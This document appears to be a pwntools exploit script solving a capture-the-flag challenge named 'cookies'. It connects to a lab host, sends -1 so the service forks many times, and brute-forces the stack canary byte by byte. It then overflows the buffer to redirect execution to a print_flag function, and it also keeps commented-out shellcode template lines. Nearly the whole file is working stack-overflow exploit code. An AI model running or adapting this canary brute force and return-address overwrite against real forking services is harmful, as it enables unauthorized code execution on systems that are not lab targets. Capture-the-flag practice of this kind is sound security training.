#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template cookies --host localhost --port 1231
from pwn import *
 # Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'cookies')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or '10.1.0.200'
port = int(args.PORT or 1231)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

from pwn import *

def canary_brute_force():
    i = 0
    x = 0
    payload = b'A'*8
    padding = b'A'*8
    print_flag_function_address  = p64(0x4012b6)
 
    p = remote("10.1.0.200", 1231)
    print(p.recvline())
    p.sendline(b'-1')    #send -1 as an answer to the "how many cookies question", to get it to provide many forks so we can brute force the canary.
    while i < 255:
        p.recvuntil("Butter.\n")
        if x == 8:  #we brute forced 8 byte and got the canary.
            break
        p.send(payload + i.to_bytes(1,"little"))
        result = p.recv()
        print("x is ", x)
        if not b'*' in result:      # stack smashing contains * so that means canary is correct.
            payload += i.to_bytes(1,"little")
            i = 0
            x += 1
        i += 1
        print(payload)
    final_payload = payload + padding + print_flag_function_address  # padding to overwrite the base pointer, and then overwrite the return address(RIP) with the address of print_flag.
    print(final_payload)    
    p.send(final_payload)
    print(p.recvuntil("Butter.\n"))

canary_brute_force()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

 
